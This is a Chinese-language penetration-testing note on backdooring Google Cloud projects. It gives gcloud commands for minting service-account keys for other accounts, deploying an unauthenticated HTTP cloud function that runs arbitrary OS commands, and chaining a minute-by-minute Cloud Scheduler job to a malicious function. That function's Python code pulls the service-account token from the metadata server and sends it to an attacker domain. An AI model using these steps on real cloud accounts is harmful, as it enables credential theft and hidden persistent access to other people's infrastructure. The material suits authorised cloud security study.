  #### 创建服务帐号密钥
	您可以通过多种方式向 GCP 进行身份验证，其中一种是通过服务帐户密钥。 服务帐户可以有多个与之关联的密钥，每个密钥都可以让您以该用户的身份访问 GCP
	用来自 Rhino Security Labs 的相同漏洞利用脚本来执行此操作。
	● https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py
	如果您使用 gcloud，您可以运行以下命令为其他用户创建服务帐户密钥：
	> gcloud iam service-accounts keys create OUTPUT-FILE--iam-account=IAM_ACCOUNT
	接下来将密钥导入 gcloud，您将能够以该用户身份与 GCP 交互。
	> gcloud auth activate-service-account --key-file=CREDENTIALS-FILE.JSON
	请注意，要运行此命令，您必须设置正确的权限，否则您将被拒绝。 如果您确实拥有正确的权限，您可以对项目中的每个服务帐户进行后门，从而让您轻松访问目标云环境
  #### 云功能
  ##### 未经认证的 HTTP 云函数
	云功能是很好的后门。 您所要做的就是创建一个未经身份验证的云函数，其触发器是一个 HTTP 请求。 接下来，您将云功能设置为执行用户发送给您的任何操作系统命令
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/911.png)

	您不想创建新功能，也可以更新另一个云功能来植入您的后门。
	要将此技术与 gcloud 一起使用，只需输入以下命令：
	● 创建一个名为 main.py 的 python 脚本
	> gcloud functions deploy NAME-OF-CLOUD-FUNCTION-HERE --entry-point ENTRY-POINT-HERE --runtime python37 --trigger-http --allow-unauthenticated
  ##### 定时任务
	熟悉 Linux cron ，那么 Google Cloud Scheduler 也是如此。 Linux 恶意软件通常使用 cron 进行持久性，并且可以在云中使用相同的技术
	cron 作业可以用作许多事情的触发器，使用它来发送 Pub/Sub 消息。 设置一个云函数，当它接收到 Pub/Sub 消息时将触发它。 云功能可以做任何你想做的事情，使用它来将服务帐户凭据发送到攻击者的机器。
	这种攻击只涉及三个步骤，如下所示：
	● 创建发布/订阅主题
	● 创建一个 cron 作业任务
	● 创建恶意云功能
	$ gcloud pubsub topics create test
	接下来创建一个 cron 作业，在本例中，我将创建一个每分钟执行一次的 cron 作业。
	此 cron 作业将向 Pub/Sub 主题发布消息，最终触发恶意云功能。
	$ gcloud scheduler jobs create pubsub myjob --schedule "* * * * *" --topic mytopic --message-body "Hello"
	最后创建恶意云函数。 这个函数应该用来做一些恶意行为，在这个例子中它会向攻击者发送一个身份验证令牌
	$ gcloud functions deploy <CLOUD-FUNCTION-NAME> --entry-point <PYTHON-FUNCTION-NAME> --runtime python37 --trigger-topic=<TOPIC-NAME>
	首先，我们点击元数据服务来获取附加的服务帐户身份验证令牌。
	然后我们通过 GET 请求将其发送给攻击者
```python
import requests
import json
def evil_pubsub(event, context):
    """Triggered from a message on a Cloud Pub/Sub topic.
    Args:
    event (dict): Event payload.
    context (google.cloud.functions.Context): Metadata for the event.
    """
    r = requests.get(url = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",headers={"Metadata-Flavor":"Google"})
        PARAMS = {"data":r.text}
        requests.get(url="http://<ATTCKER-DOMAIN-HERE>/",params = PARAMS)
```
    
	一旦 cron 运行，它将向 Pub/Sub 发送一条消息。 本地监听此主题，可在触发时获取附加的服务帐户凭据